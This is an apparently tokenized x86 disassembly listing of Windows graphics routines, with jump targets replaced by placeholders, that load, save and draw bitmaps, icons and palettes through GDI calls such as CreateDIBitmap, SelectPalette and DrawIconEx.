xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42a41b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425d68
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cdc0
call sub_425558
jmp r-xdata
xor eax eax
push ebp
push sub_42a4ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b014
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a422
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a4e6
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cdc0
call sub_425558
jmp r-xdata
sub_42a422
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42a4e6
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b34
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42a57b
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425d68
mov [ ebp - 0x30 ] eax
sub_42a598
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_429f4c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a5dc
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429c7c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41b014
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b34
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_429f4c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_42a074
call sub_425558
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42a64c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_429c7c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b34
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_4291a8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42a6e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_429f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a710
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_429a4c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_429c7c
mov eax esi
call sub_429d8c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_429c7c
mov eax esi
call sub_429d8c
mov eax esi
call sub_429c08
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_4291a8
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4295ac
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_429f4c
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_429f4c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_428b44
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a848
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_429c8c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4295ac
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a89c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_429c8c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4295ac
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a91c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_429c7c
mov eax ebx
call sub_429c8c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_428b44
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a9b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_429f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428a3c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_4234dc
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42a9b8
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_40391c
call sub_403970
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428a3c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a9f0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429acc
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_425540
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x5d ]
xor ecx ecx
mov edx 0x54
call sub_402b34
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x5d ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x9 ] 0x0
xor edx edx
mov [ ebp - 0x49 ] edx
mov [ ebp - 0x45 ] 0x28
mov edx [ ebp - 0x59 ]
mov [ ebp - 0x41 ] edx
mov edx [ ebp - 0x55 ]
mov [ ebp - 0x3d ] edx
mov [ ebp - 0x39 ] 0x1
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
mov [ ebp - 0x37 ] dx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
sub bl 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec bl
je r-xdata
xor eax eax
push ebp
push sub_42ab3d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5d ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4295ac
cmp [ ebp - 0x8 ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425678
mov ebx eax
push ebx
call CreateHalftonePalette
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x1
push ebx
push 0x0
call ReleaseDC
jmp r-xdata
sub bl 0x2
je r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x1d ] 0xf800
mov [ ebp - 0x19 ] 0x7e0
mov [ ebp - 0x15 ] 0x1f
jmp r-xdata
sub_42ab58
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_429c8c
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4295ac
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_42aba8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_429c8c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4295ac
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42ac04
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b34
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_429c08
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4264bc
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b04c
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b04c
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b34
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4299e0
mov dl [ r-xdata ]
call sub_425354
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_425678
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_428af8
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b04c
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41b04c
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b04c
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41b04c
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41b04c
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41b04c
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425ae8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41b04c
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_425e0c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42aec4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_429c8c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_428b44
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42af3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_4291a8
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42af64
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_42afac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4267f8
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428970
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42b000
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428974
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_42b030
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42b308
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_428970
mov eax [ esi + 0x28 ]
call sub_428974
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418d14
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42b090
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_425354
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42b0e8
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42b124
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41ae08
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41b014
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4260b8
jmp r-xdata
jmp r-xdata
call sub_425564
sub_42b19c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b229
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42b0e8
cmp eax [ rw-data ]
jne r-xdata
call sub_425564
mov eax esi
call sub_42b0e8
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4265fc
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b34
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b04c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42b250
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b2de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41ade8
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41b014
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b014
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42b308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_425564
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b2e3
mov eax [ ebp - 0x4 ]
call sub_403128
call sub_40391c
call sub_403970
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b308
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b348
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428970
mov eax [ ebx + 0x28 ]
call sub_428974
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b3c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42b19c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41b04c
pop esi
pop ebx
retn
sub_42b418
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b459
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_427274
mov ecx esi
mov edx ebx
call sub_426f14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b460
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_42b468
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_425bb8
mov [ rw-data ] eax
pop ebx
retn
sub_42b4a0
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42b4e4
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42b4a0
mov ebx eax
